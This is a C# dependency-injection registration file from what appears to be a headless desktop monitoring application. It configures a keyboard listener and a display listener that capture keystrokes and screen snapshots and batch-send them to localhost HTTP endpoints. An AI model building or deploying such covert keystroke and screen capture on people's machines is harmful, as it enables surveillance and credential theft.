using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using EMS.Core;
using EMS.Core.Interfaces;
using EMS.Core.Interfaces.Providers;
using EMS.Core.Providers;
using EMS.Infrastructure.Common.Configurations;
using EMS.Infrastructure.Common.Configurations.ListenersConfigs;
using EMS.Infrastructure.Common.Providers;
using EMS.Infrastructure.DependencyInjection;
using EMS.Infrastructure.DependencyInjection.Interfaces;
using Serilog;
using Serilog.Formatting;
using Serilog.Formatting.Json;

namespace EMS.Desktop.Headless
{
    public class DependenciesRegister
    {
        public IInjector RegisterDependencies(string jsonConfig)
        {
            var injector = UnityInjector.Instance;

            //injector
            //    .Register<IWin32ApiProvider, Win32ApiProvider>()
            //    .RegisterInstance<KeyboardApiConfig>(
            //        new KeyboardApiConfig { SleepIntervalInMilliseconds = 15 })
            //    .Register<IKeyboardApi, KeyboardApi>(
            //        injector.Resolve<IWin32ApiProvider>(),
            //        injector.Resolve<KeyboardApiConfig>())
            //    .Register<IHttpClient, DefaultHttpClient>()
            //    .RegisterInstance<KeyboardListenerConfig>(
            //        new KeyboardListenerConfig
            //        {
            //            SendCapturedItemsThreshold = 20,
            //            SendCapturedItemsDestinationUri = "http://localhost:64435/api/CapturedKeys/PostCapturedKeys",
            //            RetrySleepDurationsInMilliseconds = new List<int> { 1000, 2000, 3000 },
            //            SendCapturedItemsTimerConfig = new TimerConfig
            //            {
            //                DueTime = 5000,
            //                Period = 2000
            //            }
            //        })
            //    .Register<IListener, KeyboardListener>(
            //        nameof(KeyboardListener),
            //        injector.Resolve<IHttpClient>(),
            //        injector.Resolve<IKeyboardApi>(),
            //        injector.Resolve<KeyboardListenerConfig>());

            this.RegisterLogger(injector);

            injector
                .Register<IHttpClient, DefaultHttpClient>()
                .Register<IWin32ApiProvider, Win32ApiProvider>()
                .RegisterInstance<KeyboardApiConfig>(
                    new KeyboardApiConfig { SleepIntervalInMilliseconds = 15 })
                .RegisterInstance<DisplayApiConfig>(
                    new DisplayApiConfig { DisplayWatcherSleepIntervalInMilliseconds = 1000 })
                .Register<IKeyboardApi, KeyboardApi>()
                .Register<IDisplayApi, DisplayApi>()
                .RegisterInstance<KeyboardListenerConfig>(
                    new KeyboardListenerConfig
                    {
                        SendCapturedItemsThreshold = 20,
                        SendCapturedItemsDestinationUri = "http://localhost:64435/api/CapturedKeys/PostCapturedKeys",
                        RetrySleepDurationsInMilliseconds = new List<int> { 1000, 2000, 3000 },
                        SendCapturedItemsTimerConfig = new TimerConfig
                        {
                            DueTime = 5000,
                            Period = 2000
                        }
                    })
                .RegisterInstance<DisplayListenerConfig>(
                    new DisplayListenerConfig
                    {
                        SendCapturedItemsThreshold = 3,
                        SendCapturedItemsDestinationUri = "http://localhost:64435/api/DisplaySnapshots/PostCapturedDisplaySnapshots",
                        RetrySleepDurationsInMilliseconds = new List<int> { 1000, 2000, 3000 },
                        SendCapturedItemsTimerConfig = new TimerConfig
                        {
                            DueTime = 5000,
                            Period = 2000
                        }
                    })
                .Register<IListener, KeyboardListener>(nameof(KeyboardListener))
                .Register<IListener, DisplayListener>(nameof(DisplayListener));

            var keyboardApi = injector.Resolve<IKeyboardApi>();

            return injector;
        }

        private void RegisterLogger(IInjector injector)
        {
            var delimiter = new string('*', 40);
            var formatter = new JsonFormatter(closingDelimiter: delimiter);
            var logsFilePath = @"..\..\Logs\Serilog.txt";

            var logger = new LoggerConfiguration()
                .MinimumLevel.Debug()
                .WriteTo.File(formatter, logsFilePath)
                .CreateLogger();

            injector.RegisterInstance<ILogger>(logger);
        }
    }
}
